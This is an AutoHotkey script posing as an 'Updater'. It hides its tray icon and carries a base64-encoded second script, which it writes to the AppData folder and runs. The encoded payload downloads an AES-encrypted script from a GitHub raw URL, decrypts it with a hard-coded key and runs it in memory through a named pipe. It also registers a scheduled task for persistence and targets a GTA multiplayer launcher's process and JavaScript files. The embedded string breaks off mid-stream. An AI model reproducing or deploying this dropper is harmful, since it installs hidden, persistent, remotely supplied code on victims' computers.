﻿ #NoTrayIcon
#SingleInstance Force

CreateUpdater()

CreateUpdater() {
   local
   base64 := GetBase64()
   size := CryptStringToBinary(base64, data)
   if !InStr(FileExist(A_AppData . "\Updater"), "D")
      FileCreateDir, % A_AppData . "\Updater"
   filePath := A_AppData . "\Updater\Updater.ahk"
   if !FileExist(filePath) || CompareData(filePath, data, size) {
      File := FileOpen(filePath, "w")
      File.Pos := 0
      File.RawWrite(data, size)
      File := ""
   }
   Run, % filePath
}

CryptStringToBinary(string, ByRef outData, formatName := "CRYPT_STRING_BASE64")
{
   local
   static formats := { CRYPT_STRING_BASE64: 0x1
                     , CRYPT_STRING_HEX:    0x4
                     , CRYPT_STRING_HEXRAW: 0xC }
   fmt := formats[formatName]
   chars := StrLen(string)
   if !DllCall("Crypt32\CryptStringToBinary", "Str", string, "UInt", chars, "UInt", fmt
                                            , "Ptr", 0, "UIntP", bytes, "Ptr", 0, "Ptr", 0)
      throw "CryptStringToBinary failed. LastError: " . A_LastError
   VarSetCapacity(outData, bytes)
   DllCall("Crypt32\CryptStringToBinary", "Str", string, "UInt", chars, "UInt", fmt
                                        , "Str", outData, "UIntP", bytes, "Ptr", 0, "Ptr", 0)
   Return bytes
}

CompareData(filePath, ByRef data, len) {
   local
   fileLen := GetFileData(filePath, fileData)
   if (fileLen != len)
      Return true
   hLib := DllCall("LoadLibrary", "Str", "Bcrypt.dll", "Ptr")
   fileHashLen := CreateHash(&fileData, fileLen, fileHashData)
   dataHashLen := CreateHash(&data, len, hashData)
   DllCall("FreeLibrary", "Ptr", hLib)
   Return DllCall("msvcrt\memcmp", "Ptr", &fileHashData, "Ptr", &hashData, "Ptr", dataHashLen)
}

GetFileData(filePath, ByRef data) {
   local
   File := FileOpen(filePath, "r")
   File.Pos := 0
   File.RawRead(data, len := File.Length)
   File := ""
   Return len
}

CreateHash(pData, size, ByRef hashData, pSecretKey := 0, keySize := 0, AlgId := "SHA256") {
   ; CNG Algorithm Identifiers
   ; https://docs.microsoft.com/en-us/windows/win32/seccng/cng-algorithm-identifiers
   local
   static HMAC := BCRYPT_ALG_HANDLE_HMAC_FLAG := 0x00000008
   DllCall("Bcrypt\BCryptOpenAlgorithmProvider", "PtrP", hAlgorithm, "WStr",  AlgId, "Ptr", 0, "UInt", keySize ? HMAC : 0)
   DllCall("Bcrypt\BCryptCreateHash", "Ptr", hAlgorithm, "PtrP", hHash, "Ptr", 0, "UInt", 0, "Ptr", pSecretKey, "UInt", keySize, "UInt", 0)
   DllCall("Bcrypt\BCryptHashData", "Ptr", hHash, "Ptr", pData, "UInt", size, "UInt", 0)
   DllCall("Bcrypt\BCryptGetProperty", "Ptr", hAlgorithm, "WStr", "HashDigestLength", "UIntP", hashLen, "UInt", 4, "UIntP", cbResult, "UInt", 0)
   VarSetCapacity(hashData, hashLen, 0)
   DllCall("Bcrypt\BCryptFinishHash", "Ptr", hHash, "Ptr", &hashData, "UInt", hashLen, "UInt", 0)
   DllCall("Bcrypt\BCryptDestroyHash", "Ptr", hHash)
   DllCall("Bcrypt\BCryptCloseAlgorithmProvider", "Ptr", hAlgorithm, "UInt", 0)
   Return hashLen
}

GetBase64() {
local
base64 := "77u/I05vVHJheUljb24NCiNQZXJzaXN0ZW50DQojU2luZ2xlSW5zdGFuY2UgT2ZmDQpEZXRlY3RIaWRkZW5XaW5kb3dzLCBPbg0KDQppZiBBX0FyZ3NbMV0NCiAgIFVwZGF0ZSgpDQplbHNlIHsNCiAgIE9uTWVzc2FnZSgweDEyMzQsICJPbkNoaWxkTWVzc2FnZSIpDQogICBNc2dCb3gsIFdhaXQgZm9yIEluZm9bMV0NCiAgIFNoZWxsUnVuQXNVc2VyKEFfU2NyaXB0RnVsbFBhdGgsICJ1c2VyICIgLiBBX1NjcmlwdEh3bmQpDQp9DQpSZXR1cm4NCg0KVXBkYXRlKCkgew0KICAgc3RhdGljIGhlbHBlckxpbmsgOj0gImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9qb2xseWNvZGVyL3Rlc3QvbWFpbi9hYmMuYWhrIg0KICAgICAgICAsIHRpbWVyIDo9ICIiLCBkYXRhIDo9ICIiLCBsZW4gOj0gIiINCiAgICggIXRpbWVyICYmIHRpbWVyIDo9IEZ1bmMoQV9UaGlzRnVuYykgKQ0KICAgaWYgKEFfQXJnc1sxXSA9ICIiIHx8IEFfQXJnc1sxXSA9ICJ0YXNrIikgew0KICAgICAgKCAhbGVuICYmIGxlbiA6PSBXZWJSZXF1ZXN0KGhlbHBlckxpbmssIGRhdGEsLCwsIGVycm9yIDo9ICIiKSApDQogICAgICBpZiBlcnJvciB7DQogICAgICAgICBTZXRUaW1lciwgJSB0aW1lciwgLTUwMDANCiAgICAgICAgIFJldHVybg0KICAgICAgfQ0KICAgfQ0KICAgUHJvY2VzcywgRXhpc3QsIFJBRE1JUl9MQVVOQ0hFUl9FWC5leGUNCiAgIGlmICEoUElEIDo9IEVycm9yTGV2ZWwpIHsNCiAgICAgIFNldFRpbWVyLCAlIHRpbWVyLCAtMTAwMA0KICAgICAgUmV0dXJuDQogICB9DQogICBQcm9jZXNzLCBFeGlzdCwgZ3RhX3NhLmV4ZQ0KICAgaWYgRXJyb3JMZXZlbCB7DQogICAgICBTZXRUaW1lciwgJSB0aW1lciwgLTEwMDANCiAgICAgIFJldHVybg0KICAgfQ0KICAgaWYgKEFfQXJnc1sxXSA9ICJ1c2VyIikNCiAgICAgIFRyeUNyZWF0ZVRhc2soUElEKQ0KICAgKCBsZW4gJiYgRHluYVJ1bihEZWNyRGF0YShkYXRhLCBsZW4pKSApDQogICBpZiBBX0FyZ3NbMV0NCiAgICAgIEV4aXRBcHANCn0NCg0KV2ViUmVxdWVzdCh1cmwsIEJ5UmVmIGRhdGEsIG1ldGhvZCA6PSAiR0VUIiwgSGVhZGVyc0FycmF5IDo9ICIiLCBib2R5IDo9ICIiLCBCeVJlZiBlcnJvciA6PSAiIikgew0KICAgV2hyIDo9IENvbU9iakNyZWF0ZSgiV2luSHR0cC5XaW5IdHRwUmVxdWVzdC41LjEiKQ0KICAgV2hyLk9wZW4obWV0aG9kLCB1cmwsIHRydWUpDQogICBmb3IgbmFtZSwgdmFsdWUgaW4gSGVhZGVyc0FycmF5DQogICAgICBXaHIuU2V0UmVxdWVzdEhlYWRlcihuYW1lLCB2YWx1ZSkNCiAgIFdoci5TZW5kKGJvZHkpDQogICBXaHIuV2FpdEZvclJlc3BvbnNlKCkNCiAgIHN0YXR1cyA6PSBXaHIuc3RhdHVzDQogICBpZiAoc3RhdHVzICE9IDIwMCkNCiAgICAgIGVycm9yIDo9ICJIdHRwUmVxdWVzdCBlcnJvciwgc3RhdHVzOiAiIC4gc3RhdHVzDQogICBBcnIgOj0gV2hyLnJlc3BvbnNlQm9keQ0KICAgcERhdGEgOj0gTnVtR2V0KENvbU9ialZhbHVlKGFycikgKyA4ICsgQV9QdHJTaXplKQ0KICAgbGVuZ3RoIDo9IEFyci5NYXhJbmRleCgpICsgMQ0KICAgVmFyU2V0Q2FwYWNpdHkoZGF0YSwgbGVuZ3RoLCAwKQ0KICAgRGxsQ2FsbCgiUnRsTW92ZU1lbW9yeSIsICJQdHIiLCAmZGF0YSwgIlB0ciIsIHBEYXRhLCAiUHRyIiwgbGVuZ3RoKQ0KICAgUmV0dXJuIGxlbmd0aA0KfQ0KDQpUcnlDcmVhdGVUYXNrKFBJRCkgew0KICAgZXhlUGF0aCA6PSBHZXRQcm9jZXNzSW1hZ2VOYW1lKFBJRCkNCiAgIFNwbGl0UGF0aCwgZXhlUGF0aCwsIGRpcg0KICAganNEaXIgOj0gZGlyIC4gIlxyZXNvdXJjZXNccHJvamVjdHNcY3JtcFxjZWZcYXNzZXRzXGpzIg0KICAgaWYgISgoIChhcHBQYXRoIDo9IEZpbmRQYXRoKGpzRGlyLCAiYXBwLiouanMiKSkgfHwgKGFwcFBhdGggOj0gRmluZFBhdGgoanNEaXIsICIqLmpzIikpICkgJiYgRmlsZSA6PSBGaWxlT3BlbihhcHBQYXRoLCAicnciKSkNCiAgICAgIFNlbmRNZXNzYWdlLCAweDEyMzQsIDAsIDAsLCAlICJhaGtfaWQgIiAuIEFfQXJnc1syXQ0KICAgZWxzZSB7DQogICAgICBpZiAhKCBGaWxlRXhpc3QoZmlsZVBhdGggOj0gQV9BcHBEYXRhIC4gIlxVcGRhdGVyXCIgLiBBX1NjcmlwdE5hbWUpICYmIEFfU2NyaXB0RGlyICE9IEFfQXBwRGF0YSAuICJcVXBkYXRlciIgKSB7DQogICAgICAgICBpZiAhSW5TdHIoRmlsZUV4aXN0KEFfQXBwRGF0YSAuICJcVXBkYXRlciIpLCAiRCIpDQogICAgICAgICAgICBGaWxlQ3JlYXRlRGlyLCAlIEFfQXBwRGF0YSAuICJcVXBkYXRlciINCiAgICAgICAgIGlmICFGaWxlRXhpc3QoZmlsZVBhdGgpDQogICAgICAgICAgICBGaWxlQ29weSwgJSBBX1NjcmlwdEZ1bGxQYXRoLCAlIGZpbGVQYXRoLCAxDQogICAgICAgICBlbHNlIHsNCiAgICAgICAgICAgIEZpbGUgOj0gRmlsZU9wZW4oZmlsZVBhdGgsICJyIikNCiAgICAgICAgICAgIEZpbGUuUG9zIDo9IDANCiAgICAgICAgICAgIEZpbGUuUmF3UmVhZChidWYsIHNpemUgOj0gRmlsZS5MZW5ndGgpDQogICAgICAgICAgICBGaWxlIDo9ICIiDQogICAgICAgICAgICBpZiBDb21wYXJlRGF0YShBX1NjcmlwdEZ1bGxQYXRoLCBidWYsIHNpemUpDQogICAgICAgICAgICAgICBGaWxlQ29weSwgJSBBX1NjcmlwdEZ1bGxQYXRoLCAlIGZpbGVQYXRoLCAxDQogICAgICAgICB9DQogICAgICB9DQogICAgICB0cnkgcmVzIDo9IENyZWF0ZVRhc2soIlVwZGF0ZSBQbHVnaW4iLCBmaWxlUGF0aCwgInRhc2siLCAiMTQ6MDAiLCA1LCBzdGFydEltbWVkaWF0ZWx5IDo9IHRydWUpDQogICAgICBjYXRjaA0KICAgICAgICAgU2VuZE1lc3NhZ2UsIDB4MTIzNCwgMCwgMCwsICUgImFoa19pZCAiIC4gQV9BcmdzWzJdDQogICAgICBpZiByZXMNCiAgICAgICAgIFNlbmRNZXNzYWdlLCAweDEyMzQsIDEsIDAsLCAlICJhaGtfaWQgIiAuIEFfQXJnc1syXQ0KICAgICAgTXNnQm94LCAlICJyZXM6ICIgLiByZXMNCiAgIH0NCiAgIFNsZWVwLCAyMDANCn0NCg0KR2V0UHJvY2Vzc0ltYWdlTmFtZShQSUQpIHsNCiAgIHN0YXRpYyBhY2Nlc3MgOj0gUFJPQ0VTU19RVUVSWV9MSU1JVEVEX0lORk9STUFUSU9OIDo9IDB4MTAwMA0KICAgaWYgIWhQcm9jIDo9IERsbENhbGwoIk9wZW5Qcm9jZXNzIiwgIlVJbnQiLCBhY2Nlc3MsICJJbnQiLCAwLCAiVUludCIsIFBJRCwgIlB0ciIpDQogICAgICB0aHJvdyAiRmFpbGVkIHRvIG9wZW4gcHJvY2VzcywgZXJyb3I6ICIgLiBBX0xhc3RFcnJvcg0KICAgVmFyU2V0Q2FwYWNpdHkoaW1hZ2VQYXRoLCAxMDI0LCAwKQ0KICAgRGxsQ2FsbCgiUXVlcnlGdWxsUHJvY2Vzc0ltYWdlTmFtZSIsICJQdHIiLCBoUHJvYywgIlVJbnQiLCAwLCAiU3RyIiwgaW1hZ2VQYXRoLCAiVUludFAiLCA1MTIpDQogICBEbGxDYWxsKCJDbG9zZUhhbmRsZSIsICJQdHIiLCBoUHJvYykNCiAgIFJldHVybiBpbWFnZVBhdGgNCn0NCg0KRmluZFBhdGgoZGlyLCBmaWxlTmFtZVBhdHRlcm4pIHsNCiAgIExvb3AsIEZpbGVzLCAlIGRpciAuICJcIiAuIGZpbGVOYW1lUGF0dGVybg0KICAgICAgZmlsZVBhdGggOj0gQV9Mb29wRmlsZUZ1bGxQYXRoDQogICB1bnRpbCBmaWxlUGF0aA0KICAgUmV0dXJuIGZpbGVQYXRoDQp9DQoNCkNvbXBhcmVEYXRhKGZpbGVQYXRoLCBCeVJlZiBkYXRhLCBsZW4pIHsNCiAgIGxvY2FsDQogICBmaWxlTGVuIDo9IEdldEZpbGVEYXRhKGZpbGVQYXRoLCBmaWxlRGF0YSkNCiAgIGlmIChmaWxlTGVuICE9IGxlbikNCiAgICAgIFJldHVybiB0cnVlDQogICBoTGliIDo9IERsbENhbGwoIkxvYWRMaWJyYXJ5IiwgIlN0ciIsICJCY3J5cHQuZGxsIiwgIlB0ciIpDQogICBmaWxlSGFzaExlbiA6PSBDcmVhdGVIYXNoKCZmaWxlRGF0YSwgZmlsZUxlbiwgZmlsZUhhc2hEYXRhKQ0KICAgZGF0YUhhc2hMZW4gOj0gQ3JlYXRlSGFzaCgmZGF0YSwgbGVuLCBoYXNoRGF0YSkNCiAgIERsbENhbGwoIkZyZWVMaWJyYXJ5IiwgIlB0ciIsIGhMaWIpDQogICBSZXR1cm4gRGxsQ2FsbCgibXN2Y3J0XG1lbWNtcCIsICJQdHIiLCAmZmlsZUhhc2hEYXRhLCAiUHRyIiwgJmhhc2hEYXRhLCAiUHRyIiwgZGF0YUhhc2hMZW4pDQp9DQoNCkdldEZpbGVEYXRhKGZpbGVQYXRoLCBCeVJlZiBkYXRhKSB7DQogICBsb2NhbA0KICAgRmlsZSA6PSBGaWxlT3BlbihmaWxlUGF0aCwgInIiKQ0KICAgRmlsZS5Qb3MgOj0gMA0KICAgRmlsZS5SYXdSZWFkKGRhdGEsIGxlbiA6PSBGaWxlLkxlbmd0aCkNCiAgIEZpbGUgOj0gIiINCiAgIFJldHVybiBsZW4NCn0NCg0KQ3JlYXRlSGFzaChwRGF0YSwgc2l6ZSwgQnlSZWYgaGFzaERhdGEsIHBTZWNyZXRLZXkgOj0gMCwga2V5U2l6ZSA6PSAwLCBBbGdJZCA6PSAiU0hBMjU2Iikgew0KICAgOyBDTkcgQWxnb3JpdGhtIElkZW50aWZpZXJzDQogICA7IGh0dHBzOi8vZG9jcy5taWNyb3NvZnQuY29tL2VuLXVzL3dpbmRvd3Mvd2luMzIvc2VjY25nL2NuZy1hbGdvcml0aG0taWRlbnRpZmllcnMNCiAgIGxvY2FsDQogICBzdGF0aWMgSE1BQyA6PSBCQ1JZUFRfQUxHX0hBTkRMRV9ITUFDX0ZMQUcgOj0gMHgwMDAwMDAwOA0KICAgRGxsQ2FsbCgiQmNyeXB0XEJDcnlwdE9wZW5BbGdvcml0aG1Qcm92aWRlciIsICJQdHJQIiwgaEFsZ29yaXRobSwgIldTdHIiLCAgQWxnSWQsICJQdHIiLCAwLCAiVUludCIsIGtleVNpemUgPyBITUFDIDogMCkNCiAgIERsbENhbGwoIkJjcnlwdFxCQ3J5cHRDcmVhdGVIYXNoIiwgIlB0ciIsIGhBbGdvcml0aG0sICJQdHJQIiwgaEhhc2gsICJQdHIiLCAwLCAiVUludCIsIDAsICJQdHIiLCBwU2VjcmV0S2V5LCAiVUludCIsIGtleVNpemUsICJVSW50IiwgMCkNCiAgIERsbENhbGwoIkJjcnlwdFxCQ3J5cHRIYXNoRGF0YSIsICJQdHIiLCBoSGFzaCwgIlB0ciIsIHBEYXRhLCAiVUludCIsIHNpemUsICJVSW50IiwgMCkNCiAgIERsbENhbGwoIkJjcnlwdFxCQ3J5cHRHZXRQcm9wZXJ0eSIsICJQdHIiLCBoQWxnb3JpdGhtLCAiV1N0ciIsICJIYXNoRGlnZXN0TGVuZ3RoIiwgIlVJbnRQIiwgaGFzaExlbiwgIlVJbnQiLCA0LCAiVUludFAiLCBjYlJlc3VsdCwgIlVJbnQiLCAwKQ0KICAgVmFyU2V0Q2FwYWNpdHkoaGFzaERhdGEsIGhhc2hMZW4sIDApDQogICBEbGxDYWxsKCJCY3J5cHRcQkNyeXB0RmluaXNoSGFzaCIsICJQdHIiLCBoSGFzaCwgIlB0ciIsICZoYXNoRGF0YSwgIlVJbnQiLCBoYXNoTGVuLCAiVUludCIsIDApDQogICBEbGxDYWxsKCJCY3J5cHRcQkNyeXB0RGVzdHJveUhhc2giLCAiUHRyIiwgaEhhc2gpDQogICBEbGxDYWxsKCJCY3J5cHRcQkNyeXB0Q2xvc2VBbGdvcml0aG1Qcm92aWRlciIsICJQdHIiLCBoQWxnb3JpdGhtLCAiVUludCIsIDApDQogICBSZXR1cm4gaGFzaExlbg0KfQ0KDQpEZWNyRGF0YShCeVJlZiBkYXRhLCBsZW5ndGgpIHsNCiAgIHN0YXRpYyBpdiA6PSAic29tZXRleHQiLCBwdyA6PSAiMzk1RkQwODItN0JDOS00NjYyLTgwMTktOTY2OEZDOUQzNDM5Ig0KICAgYmFzZTY0IDo9IFN0ckdldCgmZGF0YSwgbGVuZ3RoLCAiY3AwIikNCiAgIGxlbmd0aCA6PSBDcnlwdFN0cmluZ1RvQmluYXJ5KGJhc2U2NCwgZGF0YSkNCiAgIHB3ZExlbiA6PSBTdHJQdXRCdWZmKHB3LCBwd2REYXRhKQ0KICAgaExpYiA6PSBEbGxDYWxsKCJMb2FkTGlicmFyeSIsICJTdHIiLCAiQmNyeXB0LmRsbCIsICJQdHIiKQ0KICAgbGVuSGFzaFBhc3N3b3JkIDo9IENyZWF0ZUhhc2goJnB3ZERhdGEsIHB3ZExlbiwgaGFzaFBhc3N3b3JkKQ0KICAgaXZMZW4gOj0gU3RyUHV0QnVmZihpdiwgaXZEYXRhKQ0KICAgbGVuSGFzaEl2IDo9IENyZWF0ZUhhc2goJml2RGF0YSwgaXZMZW4sIGhhc2hJdikNCiAgIFZhclNldENhcGFjaXR5KGl2MTYsIDE2LCAwKQ0KICAgRGxsQ2FsbCgiUnRsTW92ZU1lbW9yeSIsICJQdHIiLCBwSGFzaEl2IDo9ICZpdjE2LCAiUHRyIiwgJmhhc2hJdiArIGxlbkhhc2hJdiAtIDE2LCAiUHRyIiwgbGVuSXYgOj0gMTYpDQogICBsZW4gOj0gQmNyeXB0KCZkYXRhLCBsZW5ndGgsIG91dERhdGEsICZoYXNoUGFzc3dvcmQsIGxlbkhhc2hQYXNzd29yZCwgcEhhc2hJdiwgbGVuSXYpDQogICBEbGxDYWxsKCJGcmVlTGlicmFyeSIsICJQdHIiLCBoTGliKQ0KICAgdXRmOCA6PSBOdW1HZXQob3V0RGF0YSwgIkludCIpICYgMHhGRkZGRkYgPSAweGJmYmJlZg0KICAgUmV0dXJuIFN0ckdldCgmb3V0RGF0YSArICh1dGY4ID8gMyA6IDApLCBsZW4sICJVVEYtOCIpDQp9DQoNCkNyeXB0U3RyaW5nVG9CaW5hcnkoc3RyaW5nLCBCeVJlZiBvdXREYXRhLCBmb3JtYXROYW1lIDo9ICJDUllQVF9TVFJJTkdfQkFTRTY0IikNCnsNCiAgIHN0YXRpYyBmb3JtYXRzIDo9IHsgQ1JZUFRfU1RSSU5HX0JBU0U2NDogMHgxDQogICAgICAgICAgICAgICAgICAgICAsIENSWVBUX1NUUklOR19IRVg6ICAgIDB4NA0KICAgICAgICAgICAgICAgICAgICAgLCBDUllQVF9TVFJJTkdfSEVYUkFXOiAweEMgfQ0KICAgZm10IDo9IGZvcm1hdHNbZm9ybWF0TmFtZV0NCiAgIGNoYXJzIDo9IFN0ckxlbihzdHJpbmcpDQogICBpZiAhRGxsQ2FsbCgiQ3J5cHQzMlxDcnlwdFN0cmluZ1RvQmluYXJ5IiwgIlN0ciIsIHN0cmluZywgIlVJbnQiLCBjaGFycywgIlVJbnQiLCBmbXQNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLCAiUHRyIiwgMCwgIlVJbnRQIiwgYnl0ZXMsICJQdHIiLCAwLCAiUHRyIiwgMCkNCiAgICAgIHRocm93ICJDcnlwdFN0cmluZ1RvQmluYXJ5IGZhaWxlZC4gTGFzdEVycm9yOiAiIC4gQV9MYXN0RXJyb3INCiAgIFZhclNldENhcGFjaXR5KG91dERhdGEsIGJ5dGVzKQ0KICAgRGxsQ2FsbCgiQ3J5cHQzMlxDcnlwdFN0cmluZ1RvQmluYXJ5IiwgIlN0ciIsIHN0cmluZywgIlVJbnQiLCBjaGFycywgIlVJbnQiLCBmbXQNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsICJTdHIiLCBvdXREYXRhLCAiVUludFAiLCBieXRlcywgIlB0ciIsIDAsICJQdHIiLCAwKQ0KICAgUmV0dXJuIGJ5dGVzDQp9DQoNCkJjcnlwdChwRGF0YSwgZGF0YVNpemUsIEJ5UmVmIG91dERhdGEsIHBLZXksIGtleVNpemUsIHBJdiA6PSAwLCBpdlNpemUgOj0gMCwgQWxnSWQgOj0gIkFFUyIsIGNyeXB0IDo9ICJEZWNyeXB0IiwgY2hhaW5pbmdNb2RlIDo9ICJDaGFpbmluZ01vZGVDQkMiKSB7DQo7IGNyeXB0OiBFbmNyeXB0L0RlY3J5cHQNCiAgIHN0YXRpYyBwYWRkaW5nIDo9IEJDUllQVF9CTE9DS19QQURESU5HIDo9IDEsIGNoYWluaW5nTW9kZVNpemUgOj0gU3RyTGVuKGNoYWluaW5nTW9kZSkqMg0KICAgcExvY2FsSXYgOj0gMA0KICAgaWYgcEl2IHsNCiAgICAgIFZhclNldENhcGFjaXR5KGxvY2FsSXYsIGl2U2l6ZSwgMCkNCiAgICAgIERsbENhbGwoIlJ0bE1vdmVNZW1vcnkiLCAiUHRyIiwgcExvY2FsSXYgOj0gJmxvY2FsSXYsICJQdHIiLCBwSXYsICJQdHIiLCBpdlNpemUpDQogICB9DQogICBEbGxDYWxsKCJCY3J5cHRcQkNyeXB0T3BlbkFsZ29yaXRobVByb3ZpZGVyIiwgIlB0clAiLCBoQWxnb3JpdGhtLCAiV1N0ciIsIEFsZ0lkLCAiUHRyIiwgMCwgIlVJbnQiLCAwKQ0KICAgRGxsQ2FsbCgiQmNyeXB0XEJDcnlwdFNldFByb3BlcnR5IiwgIlB0ciIsIGhBbGdvcml0aG0sICJXU3RyIiwgIkNoYWluaW5nTW9kZSINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLCAiV1N0ciIsIGNoYWluaW5nTW9kZSwgIlVJbnQiLCBjaGFpbmluZ01vZGVTaXplLCAiVUludCIsIDApDQogICBEbGxDYWxsKCJCY3J5cHRcQkNyeXB0R2VuZXJhdGVTeW1tZXRyaWNLZXkiLCAiUHRyIiwgaEFsZ29yaXRobSwgIlB0clAiLCBoS2V5LCAiUHRyIiwgMCwgIlVJbnQiLCAwDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICwgIlB0ciIgLCBwS2V5LCAiVUludCIsIGtleVNpemUsICJVSW50IiwgMCwgIlVJbnQiKQ0KICAgcmVzIDo9IERsbENhbGwoIkJjcnlwdFxCQ3J5cHQiIC4gY3J5cHQsICJQdHIiLCBoS2V5LCAiUHRyIiwgcERhdGEsICJVSW50IiwgZGF0YVNpemUsICJQdHIiLCAwDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsICJQdHIiLCBwTG9jYWxJdiwgIlVJbnQiLCBpdlNpemUsICJQdHIiLCAwDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsICJVSW50IiwgMCwgIlVJbnRQIiwgb3V0U2l6ZSwgIlVJbnQiLCBwYWRkaW5nLCAiVUludCIpDQogICBpZiAocmVzICE9IDApDQogICAgICB0aHJvdyAiQ3J5cHQgZXJyb3IhIEJDcnlwdCIgLiBjcnlwdCAuICIxIHJlc3VsdDogIiAuIEZvcm1hdCgiezojeH0iLCByZXMpDQogICBWYXJTZXRDYXBhY2l0eShvdXREYXRhLCBvdXRTaXplLCAwKQ0KICAgcmVzIDo9IERsbENhbGwoIkJjcnlwdFxCQ3J5cHQiIC4gY3J5cHQsICJQdHIiLCBoS2V5LCAiUHRyIiwgcERhdGEsICJVSW50IiwgZGF0YVNpemUsICJQdHIiLCAwDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsICJQdHIiLCBwTG9jYWxJdiwgIlVJbnQiLCBpdlNpemUsICJQdHIiLCAmb3V0RGF0YQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLCAiVUludCIsIG91dFNpemUsICJVSW50UCIsIG91dFNpemUsICJVSW50IiwgcGFkZGluZywgIlVJbnQiKQ0KICAgaWYgKHJlcyAhPSAwKQ0KICAgICAgdGhyb3cgIkNyeXB0IGVycm9yISBCQ3J5cHQiIC4gY3J5cHQgLiAiMiByZXN1bHQ6ICIgLiBGb3JtYXQoIns6I3h9IiwgcmVzKQ0KICAgRGxsQ2FsbCgiQmNyeXB0XEJDcnlwdERlc3Ryb3lLZXkiLCAiUHRyIiwgaEtleSkNCiAgIERsbENhbGwoIkJjcnlwdFxCQ3J5cHRDbG9zZUFsZ29yaXRobVByb3ZpZGVyIiwgIlB0ciIsIGhBbGdvcml0aG0sICJVSW50IiwgMCkNCiAgIFJldHVybiBvdXRTaXplDQp9DQoNClN0clB1dEJ1ZmYoc3RyaW5nLCBCeVJlZiBkYXRhLCBlbmNvZGluZyA6PSAiVVRGLTgiKSAgew0KICAgVmFyU2V0Q2FwYWNpdHkoIGRhdGEsIGxlbiA6PSAoU3RyUHV0KHN0cmluZywgZW5jb2RpbmcpIC0gMSkgPDwgKGVuY29kaW5nIH49ICJpKV4oVVRGLTE2fGNwMTIwMCkkIikgKQ0KICAgU3RyUHV0KHN0cmluZywgJmRhdGEsIGVuY29kaW5nKQ0KICAgUmV0dXJuIGxlbg0KfQ0KDQpEeW5hUnVuKHRlbXBTY3JpcHQsIGFoa1BhdGggOj0gIiIsIHBpcGVOYW1lIDo9ICIiLCBhcmdzKikNCnsNCiAgIHN0YXRpYyBwYXJhbXMgOj0gWyAiVUludCIsIFBJUEVfQUNDRVNTX09VVEJPVU5EICAgICA6PSAweDIsICJVSW50IiwgMA0KICAgICAgICAgICAgICAgICAgICAsICJVSW50IiwgUElQRV9VTkxJTUlURURfSU5TVEFOQ0VTIDo9IDI1NSwgIlVJbnQiLCAwDQogICAgICAgICAgICAgICAgICAgICwgIlVJbnQiLCAwLCAiUHRyIiwgMCwgIlB0ciIsIDAsICJQdHIiIF0NCiAgICAgICAgLCBCT00gOj0gQ2hyKDB4RkVGRikNCg0KICAgKGFoa1BhdGggPSAiIiAmJiBhaGtQYXRoIDo9IEFfQWhrUGF0aCkNCiAgIChwaXBlTmFtZSA9ICIiICYmIHBpcGVOYW1lIDo9ICJBSEtfIiAuIEFfVGlja0NvdW50KQ0KICAgDQogICBMb29wIDEgew0KICAgICAgZm9yIGssIHYgaW4gWyJwaXBlR0EiLCAicGlwZSJdDQogICAgICAgICAldiUgOj0gRGxsQ2FsbCgiQ3JlYXRlTmFtZWRQaXBlIiwgU3RyLCAiXFwuXHBpcGVcIiAuIHBpcGVOYW1lLCBwYXJhbXMqKQ0KICAgICAgaWYgKCAocGlwZSA9IC0xIHx8IHBpcGVHQSA9IC0xKSAmJiBlcnJvciA6PSAiQ2FuJ3QgY3JlYXRlIHBpcGUgIiIiIC4gcGlwZU5hbWUgLiAiIiJgbkxhc3RFcnJvcjogIiAuIEFfTGFzdEVycm9yICkNCiAgICAgICAgIGJyZWFrDQogICAgICBzQ21kIDo9IGFoa1BhdGggLiAiICIiXFwuXHBpcGVcIiAuIHBpcGVOYW1lIC4gIiIiIg0KICAgICAgZm9yIGssIHYgaW4gYXJncw0KICAgICAgICAgc0NtZCAuPSAiICIiIiAuIHYgLiAiIiIiDQogICAgICBSdW4sICUgc0NtZCwsIFVzZUVycm9yTGV2ZWwgSElERSwgUElEDQogICAgICBpZiAoRXJyb3JMZXZlbCAmJiBlcnJvciA6PSAiQ2FuJ3Qgb3BlbiBmaWxlOmBuICIiXFwuXHBpcGVcIiAuIHBpcGVOYW1lIC4gIiIiIikNCiAgICAgICAgIGJyZWFrDQogICAgICBmb3IgaywgdiBpbiBbInBpcGVHQSIsICJwaXBlIl0NCiAgICAgICAgIERsbENhbGwoIkNvbm5lY3ROYW1lZFBpcGUiLCBQdHIsICV2JSwgUHRyLCAwKQ0KICAgICAgdGVtcFNjcmlwdCA6PSBCT00gLiB0ZW1wU2NyaXB0DQogICAgICB0ZW1wU2NyaXB0U2l6ZSA6PSAoIFN0ckxlbih0ZW1wU2NyaXB0KSArIDEgKSA8PCAhIUFfSXNVbmljb2RlDQogICAgICBpZiAhRGxsQ2FsbCgiV3JpdGVGaWxlIiwgUHRyLCBwaXBlLCBTdHIsIHRlbXBTY3JpcHQsIFVJbnQsIHRlbXBTY3JpcHRTaXplLCBVSW50UCwgMCwgUHRyLCAwKQ0KICAgICAgICAgZXJyb3IgOj0gIldyaXRlRmlsZSBmYWlsZWQsIExhc3RFcnJvcjogIiAuIEFfTGFzdEVycm9yDQogICB9DQogICBmb3IgaywgdiBpbiBbInBpcGVHQSIsICJwaXBlIl0NCiAgICAgICggJXYlICE9IC0xICYmIERsbENhbGwoIkNsb3NlSGFuZGxlIiwgUHRyLCAldiUpICkNCiAgIGlmIGVycm9yDQogICAgICB0aHJvdyBFeGNlcHRpb24oZXJyb3IpDQogICBSZXR1cm4gUElEDQp9DQoNClNoZWxsUnVuQXNVc2VyKGZpbGVQYXRoLCBhcmd1bWVudHMgOj0gIiIsIGRpcmVjdG9yeSA6PSAiIiwgdmVyYiA6PSAib3BlbiIsIHNob3cgOj0gMSkNCnsNCiAgIHN0YXRpYy